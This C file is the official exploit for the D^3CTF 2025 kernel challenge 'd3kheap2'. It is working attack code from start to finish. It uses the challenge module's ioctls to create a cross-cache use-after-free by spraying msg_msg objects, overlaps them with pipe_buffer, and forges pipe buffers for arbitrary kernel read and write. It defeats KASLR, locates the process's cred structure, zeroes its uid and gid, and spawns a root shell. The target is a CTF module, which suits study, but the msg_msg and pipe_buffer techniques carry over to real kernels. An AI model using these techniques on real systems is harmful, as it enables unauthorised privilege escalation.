/**
 * Copyright (c) 2025 arttnba3 <arttnba@gmail.com>
 *
 * This work is licensed under the terms of the GNU GPL, version 2 or later.
**/

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <stdint.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/msg.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/prctl.h>

/**
 * Kernel Pwn Infrastructures
**/

#define SUCCESS_MSG(msg)    "\033[32m\033[1m" msg "\033[0m"
#define INFO_MSG(msg)       "\033[34m\033[1m" msg "\033[0m"
#define ERROR_MSG(msg)      "\033[31m\033[1m" msg "\033[0m"

#define log_success(msg)    puts(SUCCESS_MSG(msg))
#define log_info(msg)       puts(INFO_MSG(msg))
#define log_error(msg)      puts(ERROR_MSG(msg))

#define KASLR_GRANULARITY 0x10000000
#define KASLR_MASK (~(KASLR_GRANULARITY - 1))
size_t kernel_base = 0xffffffff81000000, kernel_offset = 0;
size_t page_offset_base = 0xffff888000000000, vmemmap_base = 0xffffea0000000000;

void err_exit(char *msg)
{
    printf(ERROR_MSG("[x] Error at: ") "%s\n", msg);
    sleep(5);
    exit(EXIT_FAILURE);
}

void bind_core(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    printf(SUCCESS_MSG("[*] Process binded to core ") "%d\n", core);
}

void get_root_shell(void)
{
    if(getuid()) {
        log_error("[x] Failed to get the root!");
        sleep(5);
        exit(EXIT_FAILURE);
    }

    log_success("[+] Successful to get the root.");
    log_info("[*] Execve root shell now...");

    system("/bin/sh");

    /* to exit the process normally, instead of potential segmentation fault */
    exit(EXIT_SUCCESS);
}

struct page;
struct pipe_inode_info;
struct pipe_buf_operations;

/* read start from len to offset, write start from offset */
struct pipe_buffer {
	struct page *page;
	unsigned int offset, len;
	const struct pipe_buf_operations *ops;
	unsigned int flags;
	unsigned long private;
};

struct cred {
    long usage;
    uint32_t uid;
    uint32_t gid;
    uint32_t suid;
    uint32_t sgid;
    uint32_t euid;
    uint32_t egid;
    uint32_t fsuid;
    uint32_t fsgid;
};

int get_msg_queue(void)
{
    return msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
}

int read_msg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    return msgrcv(msqid, msgp, msgsz, msgtyp, 0);
}

/**
 * the msgp should be a pointer to the `struct msgbuf`,
 * and the data should be stored in msgbuf.mtext
 */
int write_msg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    ((struct msgbuf*)msgp)->mtype = msgtyp;
    return msgsnd(msqid, msgp, msgsz, 0);
}

#ifndef MSG_COPY
    #define MSG_COPY 040000
#endif

/* for MSG_COPY, `msgtyp` means to read no.msgtyp msg_msg on the queue */
int peek_msg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    return msgrcv(msqid, msgp, msgsz, msgtyp, 
                  MSG_COPY | IPC_NOWAIT | MSG_NOERROR);
}

/**
 * Challenge Interface
**/

#define D3KHEAP2_OBJ_ALLOC  0x3361626e
#define D3KHEAP2_OBJ_FREE   0x74747261
#define D3KHEAP2_OBJ_EDIT   0x54433344
#define D3KHEAP2_OBJ_SHOW   0x4e575046

struct d3kheap2_ureq {
    size_t idx;
};

int d3kheap2_alloc(int fd, size_t idx)
{
    struct d3kheap2_ureq ureq = {
        .idx = idx,
    };

    return ioctl(fd, D3KHEAP2_OBJ_ALLOC, &ureq);
}

int d3kheap2_free(int fd, size_t idx)
{
    struct d3kheap2_ureq ureq = {
        .idx = idx,
    };

    return ioctl(fd, D3KHEAP2_OBJ_FREE, &ureq);
}

int d3kheap2_edit(int fd, size_t idx)
{
    struct d3kheap2_ureq ureq = {
        .idx = idx,
    };

    return ioctl(fd, D3KHEAP2_OBJ_EDIT, &ureq);
}

int d3kheap2_show(int fd, size_t idx)
{
    struct d3kheap2_ureq ureq = {
        .idx = idx,
    };

    return ioctl(fd, D3KHEAP2_OBJ_SHOW, &ureq);
}

/**
 * Exploitation procedure
**/

#define D3KHEAP2_BUF_NR 0x100
#define D3KHEAP2_OBJ_SZ 2048
#define KMALLOC_2K_OBJ_PER_SLUB 16

#define MSG_QUEUE_NR 0x400
/* it cannot be big because the system limits that */
#define MSG_SPRAY_NR 2
#define MSG_SCAVENGER_SZ (D3KHEAP2_OBJ_SZ - 0x30)
#define MSG_SPRAY_SZ (0x1000 - 0x30 + D3KHEAP2_OBJ_SZ - 8)
/* prepare_copy() will do allocation, so we use bigger size for msg_msgseg */
#define MSG_PEEK_SZ (0x1000 - 0x30 + 0x1000 - 8)
#define MSG_TAG_BASE 0x3361626e74747261

#define PIPE_FCNTL_SZ (0x1000 * 32)
#define PIPE_SPRAY_NR 0x180

struct pipe_buffer *fake_pipe_buf;
struct pipe_buf_operations *pipe_ops;
unsigned int pipe_flags;
unsigned long pipe_private;
int pipe_fd[PIPE_SPRAY_NR][2], atk_pipe[2];
int victim_pipe, ovlp_pipe;

void arbitrary_read_by_pipe(
    size_t page_addr,
    void *buf,
    size_t len,
    int atk_msgq,
    size_t *msg_buf,
    size_t msgsz,
    long msgtyp
)
{
    if (read_msg(atk_msgq, msg_buf, msgsz, msgtyp) < 0){
        err_exit("FAILED to read msg_msg and msg_msgseg!");
    }

    fake_pipe_buf = (struct pipe_buffer*) &msg_buf[511];
    fake_pipe_buf->page = (struct page*) page_addr;
    fake_pipe_buf->len = 0xff8;
    fake_pipe_buf->offset = 0;
    fake_pipe_buf->flags = pipe_flags;
    fake_pipe_buf->ops = pipe_ops;
    fake_pipe_buf->private = pipe_private;

    /*
    for (int i = 0; i < 0x80; i++) {
        char ch[8];
        for (int j = 0; j < 8; j++) {
            ch[j] = 'A' + i;
        }

        msg_buf[500 + i] = *(size_t*) ch;
    }
    */

    if (write_msg(atk_msgq, msg_buf, msgsz, msgtyp) < 0) {
        err_exit("FAILED to allocate msg_msg to overwrite pipe_buffer!");
    }

    if (read(atk_pipe[0], buf, 0xff0) < 0) {
        perror("[x] Unable to read from pipe");
        err_exit("FAILED to read from evil pipe!");
    }
}

void arbitrary_write_by_pipe(
    size_t page_addr,
    void *buf,
    size_t len,
    int atk_msgq,
    size_t *msg_buf,
    size_t msgsz,
    long msgtyp
)
{
    fake_pipe_buf = (struct pipe_buffer*) &msg_buf[516];

    if (read_msg(atk_msgq, msg_buf, msgsz, msgtyp) < 0){
        err_exit("FAILED to read msg_msg and msg_msgseg!");
    }

    fake_pipe_buf->page = (struct page*) page_addr;
    fake_pipe_buf->len = 0;
    fake_pipe_buf->offset = 0;
    fake_pipe_buf->ops = pipe_ops;

    if (write_msg(atk_msgq, msg_buf, msgsz, msgtyp) < 0) {
        err_exit("FAILED to allocate msg_msg to overwrite pipe_buffer!");
    }

    len = len > 0xffe ? 0xffe : len;

    if(write(atk_pipe[1], buf, len) < 0) {
        perror("[x] Unable to write into pipe");
        err_exit("FAILED to write into evil pipe!");
    }
}

#define D3KHEAP2_BUF_SPRAY_NR D3KHEAP2_BUF_NR

void exploit(void)
{
    struct pipe_buffer *leak_pipe_buf;
    int reclaim_msgq[MSG_QUEUE_NR], atk_msgq;
    int vuln_msgq[MSG_QUEUE_NR], evil_msgq[MSG_QUEUE_NR];
    int vulq_idx, vulm_idx, evilq_idx, evilm_idx, found;
    size_t pipe_spray_nr, msg_spray_nr;
    int d3kheap2_fd;
    char err_msg[0x1000];
    size_t buf[0x1000], msg_buf[0x1000];
    size_t kernel_leak, current_pcb_page, *comm_addr;
    uint32_t uid, gid;
    uint64_t cred_kaddr, cred_kpage_addr;
    struct cred *cred_data;
    char cred_data_buf[0x1000];
    int errno;
    struct rlimit rl;

    log_info("[*] Preparing env...");

    rl.rlim_cur = 4096;
    rl.rlim_max = 4096;
    if (setrlimit(RLIMIT_NOFILE, &rl) == -1) {
        perror("[x] setrlimit");
        err_exit("FAILED to expand file descriptor's limit!");
    }

    bind_core(0);

    memset(buf, 0, sizeof(buf));

    d3kheap2_fd = open("/proc/d3kheap2", O_RDWR);
    if (d3kheap2_fd < 0) {
        perror(ERROR_MSG("[x] Unable to open chal fd"));
        err_exit("FAILED to open /dev/d3kheap2!");
    }

    log_info("[*] Preparing msg_queue...");

    for (int i = 0; i < MSG_QUEUE_NR; i++) {
        if ((reclaim_msgq[i] = get_msg_queue()) < 0) {
            snprintf(
                err_msg,
                sizeof(err_msg) - 1,
                "[x] Unable to allocate no.%d reclaim msg_queue",
                i
            );
            perror(err_msg);
            err_exit("FAILED to allocate msg_queue for clearing partial SLUB!");
        }
    }

    for (int i = 0; i < MSG_QUEUE_NR; i++) {
        if ((vuln_msgq[i] = get_msg_queue()) < 0) {
            snprintf(
                err_msg,
                sizeof(err_msg) - 1,
                "[x] Unable to allocate no.%d vuln msg_queue",
                i
            );
            perror(err_msg);
            err_exit("FAILED to allocate msg_queue to be UAF!");
        }
    }

    for (int i = 0; i < MSG_QUEUE_NR; i++) {
        if ((evil_msgq[i] = get_msg_queue()) < 0) {
            snprintf(
                err_msg,
                sizeof(err_msg) - 1,
                "[x] Unable to allocate no.%d evil msg_queue",
                i
            );
            perror(err_msg);
            err_exit("FAILED to allocate msg_queue to be evil!");
        }
    }

    if (atk_msgq = get_msg_queue() < 0) {
        perror("[x] Unable to allocate attacker msg_queue");
        err_exit("FAILED to allocate msg_queue for attacking!");
    }

    log_info("[*] Preparing msg_msg...");

    for (int i = 0; i < MSG_QUEUE_NR; i++) {
        for (int j = 0; j < MSG_SPRAY_NR; j++) {
            if (write_msg(
                reclaim_msgq[i],
                buf,
                0x1000 - 0x30,
                MSG_TAG_BASE + j
            ) < 0) {
                snprintf(
                    err_msg,
                    sizeof(err_msg) - 1,
                    "[x] Unable to prealloc %d-%d 4k msg_msg\n",
                    i,
                    j
                );
                perror(err_msg);
                err_exit("FAILED to spray msg_msg!");
            }
        }
    }

    log_info("[*] Preparing pipe_buffer...");

    for (int i = 0; i < PIPE_SPRAY_NR; i++) {
        if (pipe(pipe_fd[i]) < 0) {
            snprintf(
                err_msg,
                sizeof(err_msg) - 1,
                "[x] Unable to create %d pipe\n",
                i
            );
            perror(err_msg);
            err_exit("FAILED to prepare pipe_buffer!");
        }
    }

    log_info("[*] Spraying d3kheap2 buffer...");

    for (int i = 0; i < D3KHEAP2_BUF_SPRAY_NR; i++) {
        if ((errno = d3kheap2_alloc(d3kheap2_fd, i)) < 0) {
            printf(
                ERROR_MSG("FAILED to allocate no.")"%d"
                ERROR_MSG("d3kheap2 buffer! Retval: ")"%d\n",
                i,
                errno
            );
            err_exit("FAILED to allocate d3kheap2 buffer!");
        }
    }

    log_info(
        "[*] Freeing d3kheap2 buffer into buddy "
        "and reclaiming as kmalloc-cg-2k SLUB page..."
    );

    pipe_spray_nr = msg_spray_nr = 0;

    for (int i = 0; i < D3KHEAP2_BUF_SPRAY_NR; i++) {
        if ((i / KMALLOC_2K_OBJ_PER_SLUB) % 2 == 0) {
            continue;
        }

        if ((errno = d3kheap2_free(d3kheap2_fd, i)) < 0) {
            printf(
                ERROR_MSG("FAILED to free no.")"%d"
                ERROR_MSG("d3kheap2 buffer! Retval: ")"%d\n",
                i,
                errno
            );
            err_exit("FAILED to free d3kheap2 buffer!");
        }
    }

    log_info("[*] Spraying msg_msg to reclaim...");

    for (int i = 0; i < MSG_QUEUE_NR; i++) {
        for (int j = 0; j < (MSG_SPRAY_NR / 2); j++) {
            if (read_msg(reclaim_msgq[i],buf,0x1000-0x30,MSG_TAG_BASE+j) < 0) {
                snprintf(
                    err_msg,
                    sizeof(err_msg) - 1,
                    "[x] Unable to reclaim %d-%d 4k msg_msg\n",
                    i,
                    j
                );
                perror(err_msg);
                err_exit("FAILED to reclaim msg_msg!");
            }

            buf[520] = i;
            buf[521] = j;

            if (write_msg(vuln_msgq[i],buf,MSG_SPRAY_SZ,MSG_TAG_BASE+j) < 0) {
                snprintf(
                    err_msg,
                    sizeof(err_msg) - 1,
                    "[x] Unable to alloc %d-%d msg_msg with msg_msgseg\n",
                    i,
                    j
                );
                perror(err_msg);
                err_exit("FAILED to spray msg_msg!");
            }
        }
    }

    for (int i = 0; i < D3KHEAP2_BUF_SPRAY_NR; i++) {
        if ((i / KMALLOC_2K_OBJ_PER_SLUB) % 2 != 0) {
            continue;
        }

        if ((errno = d3kheap2_free(d3kheap2_fd, i)) < 0) {
            printf(
                ERROR_MSG("FAILED to free no.")"%d"
                ERROR_MSG("d3kheap2 buffer! Retval: ")"%d\n",
                i,
                errno
            );
            err_exit("FAILED to free d3kheap2 buffer!");
        }
    }

    log_info("[*] Spraying msg_msg to reclaim...");

    for (int i = 0; i < MSG_QUEUE_NR; i++) {
        for (int j = MSG_SPRAY_NR / 2; j < MSG_SPRAY_NR; j++) {
            if (read_msg(reclaim_msgq[i],buf,0x1000-0x30,MSG_TAG_BASE+j) < 0) {
                snprintf(
                    err_msg,
                    sizeof(err_msg) - 1,
                    "[x] Unable to reclaim %d-%d 4k msg_msg\n",
                    i,
                    j
                );
                perror(err_msg);
                err_exit("FAILED to reclaim msg_msg!");
            }

            buf[520] = i;
            buf[521] = j;

            if (write_msg(vuln_msgq[i], buf, MSG_SPRAY_SZ, MSG_TAG_BASE+j) < 0){
                snprintf(
                    err_msg,
                    sizeof(err_msg) - 1,
                    "[x] Unable to alloc %d-%d msg_msg with msg_msgseg\n",
                    i,
                    j
                );
                perror(err_msg);
                err_exit("FAILED to spray msg_msg!");
            }
        }
    }

    /* To be honest, we only need to free ONE obj here, just think :) */
    log_info("[*] Creating UAF on msg_msg...");

    for (int i = 0; i < D3KHEAP2_BUF_SPRAY_NR; i++) {
        if ((errno = d3kheap2_free(d3kheap2_fd, i)) < 0) {
            printf(
                ERROR_MSG("FAILED to free no.")"%d"
                ERROR_MSG("d3kheap2 buffer! Retval: ")"%d\n",
                i,
                errno
            );
            err_exit("FAILED to free d3kheap2 buffer!");
        }
    }

    found = 0;
    for (int i = 0; i < MSG_QUEUE_NR; i++) {
        for (int j = 0; j < MSG_SPRAY_NR; j++) {
            buf[520] = *(size_t*) "arttnba3";
            buf[520] += i;
            buf[521] = *(size_t*) "D3CTFPWN";
            buf[521] += j;

            if (write_msg(evil_msgq[i], buf, MSG_SPRAY_SZ, MSG_TAG_BASE + j)<0){
                snprintf(
                    err_msg,
                    sizeof(err_msg) - 1,
                    "[x] Unable to alloc %d-%d msg_msg with msg_msgseg\n",
                    i,
                    j);
                perror(err_msg);
                err_exit("FAILED to spray msg_msg!");
            }
        }
    }

    /* make sure the UAF object is on CPU SLAB, so no more spray then */
    for (int k = 0; k < MSG_QUEUE_NR; k++) {
        for (int l = 0; l < MSG_SPRAY_NR; l++) {
            if (peek_msg(vuln_msgq[k], buf, MSG_PEEK_SZ, l) < 0) {
                snprintf(
                    err_msg,
                    sizeof(err_msg) - 1,
                    "[x] Unable to peek %d-%d msg_msg\n",
                    k,
                    l
                );
                perror(err_msg);
                err_exit("FAILED to peek msg_msg!");
            }

            if (buf[520] == *(size_t*) "arttnba3"
                || buf[521] == *(size_t*) "D3CTFPWN") {
                evilq_idx = buf[520] - *(size_t*) "arttnba3";
                evilm_idx = buf[521] - *(size_t*) "D3CTFPWN";
                vulq_idx = k;
                vulm_idx = l;
                printf(
                    SUCCESS_MSG("[+] Found victim on no.")"%d "
                    SUCCESS_MSG("msg in no.")"%d"SUCCESS_MSG("vulqueue")
                    SUCCESS_MSG(".Same msg is on no.")"%d "
                    SUCCESS_MSG("msg in no.")"%d \n",
                    vulm_idx,
                    vulq_idx,
                    evilm_idx,
                    evilq_idx
                );
                found = 1;
                goto out_uaf_msg;
            }
        }
    }

    if (!found) {
        err_exit("FAILED to create cross-cache UAF by spraying msg_msg!");
    }

out_uaf_msg:
    log_info("[*] Shifting obj-overlapping from msg_msg to pipe_buffer...");

    if (read_msg(vuln_msgq[vulq_idx],buf,MSG_SPRAY_SZ,MSG_TAG_BASE+vulm_idx)<0){
        perror("[x] Unable to free the victim msg_msg");
        err_exit("FAILED to free victim msg_msg!");
    }

    for (int i = 0; i < (PIPE_SPRAY_NR / 2); i++) {
        if (fcntl(pipe_fd[i][1], F_SETPIPE_SZ, 0x1000 * 32) < 0) {
            snprintf(
                err_msg,
                sizeof(err_msg) - 1,
                "[x] Unable to fcntl(F_SETPIPE_SZ) on no.%d pipe",
                i
            );
            perror(err_msg);
            err_exit("FAILED to reclaim msg_msg with pipe_buffer!");
        }
    }

    if (read_msg(
        evil_msgq[evilq_idx],
        buf,
        MSG_SPRAY_SZ,
        MSG_TAG_BASE + evilm_idx
    ) < 0) {
        perror("[x] Unable to free the victim msg_msg");
        err_exit("FAILED to free victim msg_msg!");
    }

    /* identification */
    for (int i = 0; i < (PIPE_SPRAY_NR / 2); i++) {
        /* The greate j8 helps us a lot :) */
        for (int j = 0; j < 8; j++) {
            write(pipe_fd[i][1], &i, sizeof(i));
        }
    }

    found = 0;
    for (int i = (PIPE_SPRAY_NR / 2); i < PIPE_SPRAY_NR; i++) {
        if (fcntl(pipe_fd[i][1], F_SETPIPE_SZ, 0x1000 * 32) < 0) {
            snprintf(
                err_msg,
                sizeof(err_msg) - 1,
                "[x] Unable to fcntl(F_SETPIPE_SZ) on no.%d pipe",
                i
            );
            perror(err_msg);
            err_exit("FAILED to reclaim msg_msg with pipe_buffer!");
        }

        for (int j = 0; j < 114; j++) {
            write(pipe_fd[i][1], &i, sizeof(i));
        }

        /**
         * we keep checking to make sure that the object is allocated
         * from the first object of CPU SLUB, hence no spray later
         */
        for (int j = 0; j < (PIPE_SPRAY_NR / 2); j++) {
            int ident;
            read(pipe_fd[j][0], &ident, sizeof(ident));
            if (ident != j) {
                printf(
                    SUCCESS_MSG("[+] Found victim pipe: ")"%d"
                    SUCCESS_MSG(" , overlapped with ")"%d\n",
                    j,
                    ident
                );
                victim_pipe = j;
                ovlp_pipe = ident;
                goto out_overlap_pipe;
            }
            write(pipe_fd[j][1], &ident, sizeof(ident));
        }
    }

    if (!found) {
        err_exit("FAILED to shift OVERLAP from msg_msg to pipe_buffer!");
    }

out_overlap_pipe:
    close(pipe_fd[victim_pipe][1]);
    close(pipe_fd[victim_pipe][0]);

    if (pipe(atk_pipe) < 0 || fcntl(atk_pipe[1], F_SETPIPE_SZ, 0x1000*32) < 0) {
        err_exit("FAILED to allocate new pipe for attacking!");
    }

    /* move to pipe_buffer[1] */
    write(atk_pipe[1], "arttnba3", 8);
    read(atk_pipe[0], buf, 8);
    write(atk_pipe[1], "arttnba3", 8);

    close(pipe_fd[ovlp_pipe][1]);
    close(pipe_fd[ovlp_pipe][0]);

    memset(buf, 0, sizeof(buf));
    if (write_msg(atk_msgq, buf, MSG_SPRAY_SZ, MSG_TAG_BASE) < 0) {
        perror("[x] Unable to allocate new msg_msg");
        err_exit("FAILED to reclaim the victim pipe_buffer as msg_msg!");
    }

    write(atk_pipe[1], "arttnba3", 8);

    if (read_msg(atk_msgq, msg_buf, MSG_SPRAY_SZ, MSG_TAG_BASE) < 0) {
        perror("[x] Unable to peek the victim object");
        err_exit("FAILED to peek the victim object!");
    }

    leak_pipe_buf = (void*) &msg_buf[516];

    printf(
        SUCCESS_MSG("[+] Leak pipe_buffer::page ") "%p"
        SUCCESS_MSG(", pipe_buffer::ops ") "%p\n",
        leak_pipe_buf->page,
        leak_pipe_buf->ops
    );

    pipe_flags = leak_pipe_buf->flags;
    pipe_ops = (void*) leak_pipe_buf->ops;
    pipe_private = leak_pipe_buf->private;

    vmemmap_base = (size_t) leak_pipe_buf->page & KASLR_MASK;
    log_info("[*] Try to guess vmemmap_base...");
    printf("[*] Starts from %lx...\n", vmemmap_base);

    if (write_msg(atk_msgq, msg_buf, MSG_SPRAY_SZ, MSG_TAG_BASE) < 0) {
        perror("[x] Unable to allocate new msg_msg");
        err_exit("FAILED to reclaim the victim pipe_buffer as msg_msg!");
    }

    arbitrary_read_by_pipe(
        vmemmap_base + 0x9d000 / 0x1000 * 0x40,
        buf,
        0xff0,
        atk_msgq,
        msg_buf,
        MSG_SPRAY_SZ,
        MSG_TAG_BASE
    );

    kernel_leak = buf[0];
    for (int loop_nr = 0; 1; loop_nr++) {
        if (kernel_leak > 0xffffffff81000000
            && (kernel_leak & 0xff) < 0x100) {
            kernel_base = kernel_leak & 0xfffffffffffff000;
            if (loop_nr != 0) {
                puts("");
            }
            printf(
                INFO_MSG("[*] Leak secondary_startup_64 : ") "%lx\n",kernel_leak
            );
            printf(SUCCESS_MSG("[+] Got kernel base: ") "%lx\n", kernel_base);
            printf(SUCCESS_MSG("[+] Got vmemmap_base: ") "%lx\n", vmemmap_base);
            break;
        } else {
            printf("[?] Got leak: %lx\n", kernel_leak);
            sleep(2);
        }

        for (int i = 0; i < 80; i++) {
            putchar('\b');
        }
        printf(
            "[No.%d loop] Got unmatched data: %lx, keep looping...",
            loop_nr,
            kernel_leak
        );

        vmemmap_base -= KASLR_GRANULARITY;
        arbitrary_read_by_pipe(
            vmemmap_base + 0x9d000 / 0x1000 * 0x40,
            buf,
            0xff0,
            atk_msgq,
            msg_buf,
            MSG_SPRAY_SZ,
            MSG_TAG_BASE
        );
    }

    log_info("[*] Seeking task_struct in kernel space...");

    prctl(PR_SET_NAME, "arttnba3pwnn");
    uid = getuid();
    gid = getgid();

    for (int i = 0; 1; i++) {
        arbitrary_read_by_pipe(
            vmemmap_base + i * 0x40,
            buf,
            0xff0,
            atk_msgq,
            msg_buf,
            MSG_SPRAY_SZ,
            MSG_TAG_BASE
        );
    
        comm_addr = memmem(buf, 0xff0, "arttnba3pwnn", 12);
        if (comm_addr && (comm_addr[-2] > 0xffff888000000000) /* task->cred */
            && (comm_addr[-3] > 0xffff888000000000) /* task->real_cred */
            && (comm_addr[-2] == comm_addr[-3])) {  /* should be equal */

            printf(
                SUCCESS_MSG("[+] Found task_struct on page: ") "%lx\n",
                (vmemmap_base + i * 0x40)
            );
            printf(SUCCESS_MSG("[+] Got cred address: ") "%lx\n",comm_addr[-2]);

            cred_kaddr = comm_addr[-2];
            cred_data = (void*) (cred_data_buf + (cred_kaddr & (0x1000 - 1)));
            page_offset_base = cred_kaddr & KASLR_MASK;

            while (1) {
                cred_kpage_addr = vmemmap_base + \
                                (cred_kaddr - page_offset_base) / 0x1000 * 0x40;
            
                arbitrary_read_by_pipe(
                    cred_kpage_addr,
                    cred_data_buf,
                    0xff0,
                    atk_msgq,
                    msg_buf,
                    MSG_SPRAY_SZ,
                    MSG_TAG_BASE
                );
                if (cred_data->uid == uid
                    && cred_data->gid == gid) {
                    printf(
                        SUCCESS_MSG("[+] Got page_offset_base: ") "%lx\n",
                        page_offset_base
                    );
                    printf(
                        SUCCESS_MSG("[+] Found cred on page: ") "%lx\n",
                        cred_kpage_addr
                    );
                    break;
                }

                page_offset_base -= KASLR_GRANULARITY;
                puts("[?] Looping!?");
            }

            break;
        }
    }

    puts("[*] Overwriting cred and granting root privilege...");

    cred_data->uid = 0;
    cred_data->gid = 0;

    arbitrary_write_by_pipe(
        cred_kpage_addr,
        cred_data_buf,
        0xff0,
        atk_msgq,
        msg_buf,
        MSG_SPRAY_SZ,
        MSG_TAG_BASE
    );

    setresuid(0, 0, 0);
    setresgid(0, 0, 0);

    get_root_shell();

    system("/bin/sh");
}

void banner(void)
{
    puts(SUCCESS_MSG("-------- D^3CTF2025::Pwn - d3kheap2 --------") "\n"
    INFO_MSG("--------    Official Exploitation   --------\n")
    INFO_MSG("--------      Author: ")"arttnba3"INFO_MSG("      --------") "\n"
    SUCCESS_MSG("-------- Local Privilege Escalation --------\n"));
}

int main(int argc, char **argv, char **envp)
{
    banner();
    exploit();
    return 0;
}
